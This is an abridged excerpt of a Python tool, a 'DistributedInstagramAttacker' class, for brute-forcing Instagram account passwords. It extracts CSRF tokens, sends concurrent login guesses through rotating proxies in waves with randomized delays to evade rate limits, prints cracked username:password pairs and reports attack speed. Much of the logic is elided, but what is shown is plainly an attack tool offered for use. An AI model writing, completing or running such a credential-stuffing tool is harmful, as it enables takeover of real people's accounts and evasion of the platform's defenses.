...
class DistributedInstagramAttacker:
        ...
        try:
            ...
            async with session.get(endpoint, proxy=proxy_dict) as response:
                if response.status == 200:
                    ...
                    extraction_methods = [
                        lambda t: t.split('"csrf_token":"')[1].split(
                            '"')[0] if '"csrf_token":"' in t else None,
                        lambda t: t.split('csrftoken=')[1].split(
                            ';')[0] if 'csrftoken=' in t else None,
                        lambda t: response.cookies.get(
                            'csrftoken').value if response.cookies.get('csrftoken') else None
                    ]
    ...
    async def single_distributed_attack(self, target: TargetConfig,
        ...
        try:
            ...
            if result['success']:
                ...
                print(
                    f"🎉 SUCCESS: {target.username}:{password} via {proxy.ip if proxy else 'direct'}")
            else:
                self.stats['failed_count'] += 1
                reason = result.get('reason', 'unknown')
                if reason == 'rate_limited':
                    print(
                        f"⏳ Rate limited: {target.username} via {proxy.ip if proxy else 'direct'}")
                else:
    ...
    async def distributed_brute_force(self) -> Dict[str, any]:
        ...
        print(
            f"🌐 Proxies: {len(list(self.proxy_cycle)) if self.proxy_cycle else 0}")
        ...
        for wave_num in range(self.waves):
            ...
            success_rate = (
                self.stats['success_count'] / max(1, self.stats['total_attempts'])) * 100
            elapsed = time.time() - self.stats['start_time']
            speed = self.stats['total_attempts'] / \
                elapsed if elapsed > 0 else 0

            print(
                f"📈 Progress: {progress:.1f}% | Success: {success_rate:.2f}% | Speed: {speed:.1f} att/s")
    ...
    async def generate_final_report(self) -> Dict[str, any]:
        ...
        print(
            f"🚀 Attack Speed: {report['statistics']['attacks_per_second']:.2f} att/s")
...
async def main():
    ...
    max_concurrent = int(
        input("🧵 Max concurrent attacks (default=30): ") or "30")
    waves = int(input("🌊 Number of waves (default=20): ") or "20")
    min_delay = float(
        input("⏱️ Min delay between attacks (default=2.0): ") or "2.0")
    max_delay = float(
        input("⏱️ Max delay between attacks (default=5.0): ") or "5.0")
